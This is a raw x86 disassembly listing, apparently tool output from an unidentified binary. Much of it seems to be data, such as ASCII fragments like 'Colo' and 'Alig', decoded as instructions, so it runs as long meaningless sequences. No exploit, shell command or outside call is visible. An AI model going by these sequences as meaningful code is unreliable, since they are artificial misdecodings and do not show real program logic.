add ah bh
xchg edi eax
inc ebx
add [ eax ] al
cwde
inc ebx
add ah bh
mov [ ebx ] sub_43c828
inc eax
mov [ 0xffffffff99780043 ] eax
inc ebx
add ah cl
movsb [ edi ] [ esi ]
inc ebx
add [ esp + 0x43 ] al
add [ eax - 0x59 ] bl
inc ebx
add [ esi ] al
inc ebx
add [ edi + 0x43 ] ch
add [ eax + ecx * 8 + 0xb8c0043 ] ch
inc esp
add [ eax + 0xc ] cl
inc esp
add [ edi + eax + 0x44 ] al
add [ esp + ecx ] ch
inc esp
add al dh
lodsb [ esi ]
inc edx
add [ eax - 0x2c ] bl
inc ebx
add al bh
loope r-xdata
add [ esi + eax * 2 + 0x41 ] dl
inc ebx
add [ eax ] dh
xor [ eax ] eax
dec esp
xor [ eax ] eax
enter 0x4429 0x0
jo r-xdata
insd
push eax
popad
outsb
insb
lea eax [ eax ]
push esp
mov es [ edx ]
pop es
or al 0x54
inc ebx
jne r-xdata
push esp
push eax
popad
outsb
insb
les ecx [ esi - 0x71afffbe ]
inc edx
add [ edx ] al
or [ ebp + 0x78 ] al
je r-xdata
add ah dh
test al 0x42
add al ah
fiadd [ ebx ]
adc ch bl
inc ebx
add [ eax - 0x6bffbc1e ] dl
loop r-xdata
inc ebx
add al bl
mov eax [ 0xffffffff9ec00041 ]
add [ esi + eax * 8 ] ch
inc ebx
add [ eax - 0x66 ] al
inc ebx
add [ ebp + ecx * 8 + 0x43 ] cl
add [ eax - 0x5d ] bl
inc esp
add [ eax + 0x540043e0 ] bl
inc esi
inc ecx
je r-xdata
imul esp [ edi + 0x6e ] 0x746e656d
jl r-xdata
je r-xdata
inc ebx
add [ ecx + 0x43 ] cl
add ah dh
loopne r-xdata
insd
push eax
popad
outsb
insb
dec eax
lea eax [ edx ]
inc esp
insb
inc ebx
add [ ebx ] cl
add [ eax ] cl
inc ebp
js r-xdata
add [ eax ] al
inc ebx
add [ ecx ] ah
add bh bh
les ebx [ eax - 0x669fffbd ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax 0x6e410700
arpl [ eax + 0x6f ] bp
jb r-xdata
pop esp
add [ eax ] al
insb
jae r-xdata
push eax
inc ebx
add [ ebp + ecx + 0x44 ] ch
add [ eax ] bl
sub al [ eax + eax - 0x50 ]
scasb [ edi ]
inc edx
add al ch
or [ eax + eax - 0x28 ] eax
or al 0x44
add ah bl
stosb [ edi ]
inc edx
add [ esi ] al
push esp
push eax
popad
outsb
insb
nop
pushfd
pop [ edx ]
pop es
push es
mov eax [ 0xffffffffa8300041 ]
inc edx
add [ ebx + edx - 0x517bffbc ] al
inc edx
add ah ch
pop ss
inc esp
add [ eax + ebx * 4 + 0xe000043 ] dh
inc esp
add [ eax ] ah
push cs
inc esp
add [ eax ] bh
or eax [ eax + eax - 0x4 ]
rcr [ esi - 0x6147ffbf ] 0x41
add al ah
inc ebx
je r-xdata
add [ eax ] al
adc [ edx ] 0x0
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x65646564
inc ebx
insb
dec ecx
outsb
outsb
jb r-xdata
add bh bh
pushfd
lodsb [ esi ]
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] eax
or al [ edx + 0x65 ]
jbe r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
add [ eax ] bl
add al [ eax ]
rcl [ 0x5f0041 ] 0x0
add [ eax ] al
str [ edx ]
inc edx
jbe r-xdata
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
adc [ edx ] eax
add bh bh
lodsb [ fs : esi ]
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
add [ ebx ] bl
add bh bh
test [ edx + 0x10043 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
dec esp
adc eax 0x2200041
add bh bh
pop eax
lodsb [ esi ]
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax + edx * 2 + 0x43 ] dl
inc ecx
add [ eax - 0x1fffbe62 ] bh
sahf
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
inc ebx
add [ edx ] dl
add al [ eax ]
inc [ eax + 0x10042ac ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
add [ eax ] al
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
push [ eax ]
add dh bh
xchg esp eax
cmpsb [ esi ] [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080012 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x6465646f
inc ebx
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
pop [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
pop [ edx ]
sub [ edx ] al
add [ eax ] al
cld
mov [ edx ] es
shl [ ecx + 0x33ec0041 ] 0x40
add [ ebx + ebx * 4 ] dl
inc ecx
add ah dh
xor eax [ eax ]
shr al 0x1
add [ ebx ] dl
add [ ebx ] cl
inc edx
outsd
jb r-xdata
insb
dec edi
jne r-xdata
inc ebx
jb r-xdata
add [ eax ] al
call [ esi ]
jb r-xdata
sbb al 0x2
add bh bh
aam 0xac
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
jb r-xdata
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
je r-xdata
jae r-xdata
pop eax
inc ebx
add [ eax + eax ] dh
inc [ edx + ecx * 8 + 0x43 ]
add [ ecx ] al
add [ 0x6f6c6f43 ] al
jb r-xdata
add [ edi ] ch
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
add [ eax ] 0x0
inc ebx
add [ edx + eax ] dl
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x6700ffff ] ah
push cs
inc esp
add [ esi + ecx + 0x44 ] bh
add [ eax - 0x80000000 ] al
sbb [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
insb
and al 0x57
inc ebx
add [ eax - 0x5b ] dh
inc ebx
add [ eax + 0x6c0043a5 ] ah
lds eax [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
adc eax 0x61430700
jo r-xdata
adc [ eax ] al
movsd [ edi ] [ esi ]
add [ eax ] eax
[ eax - 0x43ffbbf2 ]
push cs
inc esp
[ 0x1ff0002 ]
jae r-xdata
add [ eax ] al
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
inc ebx
jne r-xdata
inc eax
add [ edi - 0x1300ffff ] ah
cmove eax [ eax ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
xor eax [ eax + eax + 0x10 ]
sbb [ eax ] eax
push cs
push ebp
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
imul ebp [ edi + 0x6e ] sub_41b0b4
jo r-xdata
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ esi + ebx + 0xbc0044 ] ah
add dh bh
pop ds
add al [ eax ]
inc [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50100023 ] al
popad
insb
push edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ ebx ] cl
inc esi
jne r-xdata
add bh bh
sbb eax 0x1ff0002
jb r-xdata
add [ eax ] al
sbb al [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
cmp al 0x50
adc [ eax ] al
test al 0x1
add bh bh
xor al 0xf9
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ebx
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add bh bh
push ss
add bh bh
adc [ edi - 0x58d3ffbd ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edx ] cl
outsb
je r-xdata
outsb
imul ebp [ esi + 0x74 ] r-xdata
push 0x64ff0000
cmpsb [ esi ] [ edi ]
inc ebx
add [ esi + 0x43 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040020 ] al
outsd
outsb
je r-xdata
je r-xdata
sbb al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
push esi
inc ebx
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
add [ ecx ] 0x0
add [ eax ] al
and eax 0x61500b00
jb r-xdata
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
movsb [ edi ] [ esi ]
push ds
inc esp
add [ eax + eax + 0x21ffe00 ] bh
add bh bh
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
adc [ eax + 0x61 ] dl
adc [ eax ] al
push ds
add al [ eax ]
[ esi ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
push es
dec esp
outsd
arpl [ ebx + 0x65 ] bp
add [ fs : eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
push cs
push eax
popad
jb r-xdata
popad
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
dec [ ebp + eax * 8 + 0x43 ]
add [ eax + 0x1 ] al
push ds
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
inc eax
add [ 0x1dff0002 ] bl
add al [ eax ]
inc [ ecx ]
cmp al 0x50
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
hlt
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
outsb
je r-xdata
je r-xdata
jne r-xdata
add [ ecx ] 0x0
add [ eax ] al
daa
add [ esi ] cl
outsb
je r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
je r-xdata
outsb
xor [ eax ] 0x0
push cs
dec edi
jpe r-xdata
nop
movsb [ edi ] [ esi ]
inc ebx
add ah ch
jo r-xdata
adc [ eax ] al
0xe4ff0000 0x43a6
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
popad
jb r-xdata
push cs
je r-xdata
inc esi
and al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
add [ fs : eax ] dl
inc eax
add [ edx ] bl
add bh bh
xor al 0xa7
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
push eax
popad
jb r-xdata
add [ edx ] cl
outsd
insb
outsd
jb r-xdata
add [ eax ] al
js r-xdata
add [ eax ] al
or [ edi ] dl
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
movsb [ edi ] [ esi ]
add [ eax ] eax
dec [ edi + ecx + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
jo r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
pushfd
cmpsb [ esi ] [ edi ]
inc ebx
add [ ecx ] al
push cs
inc esp
add [ edi + ecx + 0x44 ] dh
add [ ecx ] al
push 0x6948776f
outsb
je r-xdata
adc [ eax ] al
test eax 0xc8ff0001
push cs
add [ eax ] 0x0
add [ eax + 0x4f090037 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
int3
push eax
outsd
jo r-xdata
lds eax [ ebx ]
add [ eax ] al
add [ eax + 0x1 ] al
sub al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0xc656c62
pop esi
inc ebx
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002d ] al
outsb
inc ebx
popad
outsb
push edx
jae r-xdata
adc [ eax ] al
push edi
add [ eax ] al
call [ eax - 0x13ffbc5c ]
adc [ eax ] al
cdq
add [ eax ] al
inc eax
cmpsb [ esi ] [ edi ]
inc ebx
add [ eax + 0x43a6 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080029 ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
0x7c0044 0xff00
sub [ ebp + 0x10043 ] ah
add [ eax ] al
inc edi
je r-xdata
or [ bx ] dl
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
pop ss
jo r-xdata
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
push edi
inc ebx
add ah dh
loopne r-xdata
imul esi [ ebp + 0x49 ] 0xe06f666e
pop eax
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003b ] al
outsb
dec ebp
outsd
jne r-xdata
dec edi
jb r-xdata
inc esp
pop edx
inc ebx
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0035 ] al
outsb
push edx
jae r-xdata
pop ebx
inc ebx
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0031 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f0b003f ] al
outsb
push ebx
inc ebx
add al ah
add [ eax ] al
jmp eax
pop ebp
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
outsd
ja r-xdata
add [ eax ] eax
pop ss
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax + 0x4f070038 ] al
add [ eax ] al
dec edi
jbe r-xdata
add [ edx ] cl
dec edi
jpe r-xdata
jo r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebx * 4 - 0x6733ffbe ] ch
inc edx
add [ edx + eax ] ah
add [ eax ] al
jl r-xdata
jb r-xdata
pop eax
pop ecx
inc ebx
add al bl
add [ eax ] al
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
je r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
inc esp
jb r-xdata
or cl [ edi + 0x6e ]
jb r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
xor [ edx ] 0x0
or cl [ edi + 0x6e ]
outsb
inc ebx
outsd
outsb
je r-xdata
or [ eax + 0x43 ] ah
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0030 ] al
outsb
pop esp
inc ebx
add [ eax - 0x4700ffff ] bh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0032 ] al
inc [ edx ]
shl [ ecx + 0x33ec0041 ] 0x40
add [ ebx + ebx * 4 ] dl
inc ecx
add ah dh
xor eax [ eax ]
shr al 0x1
inc ebx
add [ eax ] dh
xor [ eax ] eax
dec esp
xor [ eax ] eax
pushfd
mov dl 0x42
add [ eax + 0x18 ] dh
inc edx
add al al
mov eax [ 0x33ec0041 ]
inc eax
add [ edi + edi * 8 + 0x42 ] bh
inc esp
outsd
arpl [ ebx + 0x2c ] bp
pop ebx
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0040 ] al
outsb
push ebx
je r-xdata
dec ebp
outsd
jbe r-xdata
outsd
arpl [ ebx + 0x74 ] bp
pop ebx
inc ebx
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ss : ecx ] cl
dec edi
pop ebp
inc ebx
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d003a ] al
outsb
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060039 ] al
outsb
inc ebp
js r-xdata
outsb
inc ebp
outsb
inc esp
pop ebx
inc ebx
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
add [ eax + 0x4f0a0033 ] al
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe941959a
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0034 ] al
outsb
inc esp
jb r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
pop ss
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
mov dh 0xff
or al 0xb7
inc edx
add [ edx + ebp - 0x211fffbd ] ah
inc ebx
add [ eax ] dl
fld [ ebx ]
nop
loop r-xdata
hlt
jb r-xdata
je r-xdata
hlt
je r-xdata
inc edx
add al ch
mov dl 0x42
add [ ecx ] dl
push esp
inc ebx
jne r-xdata
add [ edx - 0x1eb3ffbd ] dl
inc ebx
add ah dh
loopne r-xdata
sbb [ eax + eax - 0x68 ] al
loopne r-xdata
inc esp
jb r-xdata
inc ecx
add ah dh
xor eax [ eax ]
shr al 0x1
inc ebx
add [ eax ] dh
xor [ eax ] eax
dec esp
xor [ eax ] eax
pushfd
mov dl 0x42
add [ eax + 0x18 ] dh
inc esp
add [ eax + 0x540043e0 ] bl
inc esi
inc ecx
insd
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
mov eax eax
in al 0x98
inc edx
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
outsd
add [ edi + esi * 4 + 0x42 ] cl
add [ eax - 0x49 ] ah
inc edx
add [ eax - 0x49 ] bh
add [ ebp + ecx + 0x44 ] ch
add [ eax ] bl
sub al [ eax + eax - 0x54 ]
push ds
inc esp
add al ch
or [ eax + eax - 0x28 ] eax
or al 0x44
add [ edx + ebp - 0x488bffbd ] dh
inc edx
add [ 0xeb00c00 ] al
mov al 0x5
add ch bh
push [ esi + 0x42b70cff ]
xchg edi eax
inc ebx
add [ eax ] al
cwde
inc ebx
add ah bh
mov [ ebx ] sub_43c828
inc eax
mov [ 0xffffffff99780043 ] eax
inc ebx
add ah cl
movsb [ edi ] [ esi ]
inc ebx
add [ esp + 0x43 ] al
add [ eax - 0x59 ] bl
inc ebx
add [ esi ] al
inc ebx
add [ edi + 0x43 ] ch
add [ eax + ecx * 8 + 0xb8c0043 ] ch
inc esp
add [ eax + 0xc ] cl
inc esp
add [ edi + eax + 0x44 ] al
add [ esp + ecx ] ch
inc esp
add [ eax + 0x2a ] cl
inc ebx
add [ eax - 0x2c ] bl
inc ebx
add al bh
loope r-xdata
inc esp
add ah bh
add al bh
mov ah 0x42
add [ eax - 0x66 ] al
inc ebx
add [ esi * 4 - 0x5ca7ffbe ] cl
inc ebx
add al bl
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0xffffffffb20c0041 ]
inc edx
add [ ebx + edx + 0x18a00044 ] al
inc esp
add ah ch
pop ss
inc esp
add [ eax + ebx * 4 + 0xe000043 ] dh
inc esp
add [ eax ] ah
push cs
inc esp
add [ eax ] bh
or eax [ eax + eax - 0x4 ]
add [ esi + eax * 2 + 0x41 ] dl
inc esp
add [ eax + 0x540043e0 ] bl
inc esi
inc ecx
call 0x31729815
inc eax
add [ ecx + esi + 0x40 ] cl
add [ edx + esi * 4 + 0x18700042 ] bl
enter 0x435c 0x0
[ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080041 ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x24 ] bp
xchg edi eax
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
cwde
jne r-xdata
add [ edx + ebp - 0x211fffbd ] ah
inc ebx
add [ eax ] dl
fld [ ebx ]
nop
loop r-xdata
add al bh
mov ah 0x42
add [ eax - 0x66 ] al
inc ebx
add [ esi * 4 - 0x5ca7ffbe ] cl
inc ebx
add al bl
mov eax [ 0xffffffff9ec00041 ]
add [ esi + eax * 2 + 0x41 ] dl
outsd
insd
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
fcom [ edi + 0xc00042 ]
inc ebx
add [ ebx ] cl
add [ eax ] cl
inc ebp
js r-xdata
jo r-xdata
cmp [ edx + 0xb070042 ] bl
push esp
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
outsd
jne r-xdata
add [ edx - 0x1eb3ffbd ] dl
inc ebx
add ah dh
loopne r-xdata
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0xffffffffb20c0041 ]
inc edx
add [ ebx + edx + 0x18a00044 ] al
inc esp
add ah ch
pop ss
inc esp
add [ eax + ebx * 4 + 0xe000043 ] dh
inc esp
add [ eax ] ah
push cs
inc esp
add [ eax ] bh
or eax [ eax + eax - 0x4 ]
xchg edi eax
inc ebx
add [ eax ] al
cwde
inc ebx
add ah bh
mov [ ebx ] sub_43c828
inc eax
mov [ 0xffffffff99780043 ] eax
inc ebx
add ah cl
movsb [ edi ] [ esi ]
inc ebx
add [ esp + 0x43 ] al
add [ eax - 0x59 ] bl
inc ebx
add [ esi ] al
inc ebx
add [ edi + 0x43 ] ch
add [ eax + ecx * 8 + 0xb8c0043 ] ch
inc esp
add [ eax + 0xc ] cl
inc esp
add [ edi + eax + 0x44 ] al
add [ esp + ecx ] ch
inc esp
add [ eax + 0x2a ] cl
inc ebx
add [ eax - 0x2c ] bl
inc ebx
add al bh
loope r-xdata
sahf
inc ebx
je r-xdata
add dh bh
xchg esp eax
cmpsb [ esi ] [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000d ] al
lds eax [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
push cs
add [ edi ] al
inc ebx
mov al [ 0x6c0043a5 ]
inc ebx
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x2465646f
add [ eax ] cl
inc edx
pop eax
cdq
inc edx
add al ah
cwde
inc edx
add [ edi ] ch
add [ eax ] cl
inc ebp
js r-xdata
add [ ebp + ecx + 0x44 ] ch
add [ eax ] bl
sub al [ eax + eax - 0x54 ]
push ds
inc esp
add al ch
or [ eax + eax - 0x28 ] eax
or al 0x44
add [ edx + ebp - 0x488bffbd ] dh
inc edx
add [ ebx ] cl
push esp
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
xor ah 0xff
imul ebp [ edi + 0x6e ] sub_41b0b4
jo r-xdata
popad
jo r-xdata
movsd [ edi ] [ esi ]
inc ebx
add [ ebp + eax * 8 + 0x43 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
insb
jae r-xdata
add [ eax - 0x67 ] bl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
0x42 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ edx + 0x2280042 ] bl
add [ eax ] al
nop
xchg edi eax
inc edx
add al al
mov eax [ 0x33ec0041 ]
inc eax
add [ ebx + ebx * 4 ] dl
add bh bh
adc [ edi - 0x58d3ffbd ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ 0xfff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
add [ ecx ] ah
add bh bh
les ebx [ eax - 0x669fffbd ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax + edx * 2 + 0x43 ] dl
add [ ebx ] bl
add bh bh
test [ edx + 0x10043 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
jl r-xdata
inc ebx
adc [ eax ] al
sbb al 0x2
add bh bh
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
rcl [ 0x5f0041 ] 0x0
push [ eax ]
add [ eax + 0x4307000e ] al
add [ eax ] al
inc ebx
add [ gs : eax ] dl
xor eax [ esp + edi + 0x50 ]
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
push edi
inc ebx
add [ eax - 0x5b ] dh
inc ebx
add [ eax + 0x6c0043a5 ] ah
adc [ eax ] al
pop es
inc ebx
outsd
insb
jne r-xdata
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
dec [ ebp + eax * 8 + 0x43 ]
add [ eax + 0x1 ] al
adc eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
push esp
mov ch 0x41
add [ eax ] ch
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
outsb
jae r-xdata
add [ 0x6d657449 ] al
jae r-xdata
adc [ eax ] al
sbb [ edx ] al
add bh bh
test al 0xb5
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
je r-xdata
adc [ eax ] al
movsd [ edi ] [ esi ]
add [ eax ] eax
[ eax - 0x43ffbbf2 ]
push cs
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
jae r-xdata
pop eax
inc ebx
add [ eax + eax ] dh
inc [ edx + ecx * 8 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0019 ] al
outsd
outsb
jae r-xdata
jmp [ esi + 0x43 ]
jae r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
or edx [ eax + 0x61 ]
jb r-xdata
jb r-xdata
add bh bh
cmpsb [ fs : esi ] [ edi ]
inc ebx
add [ esi + 0x43 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
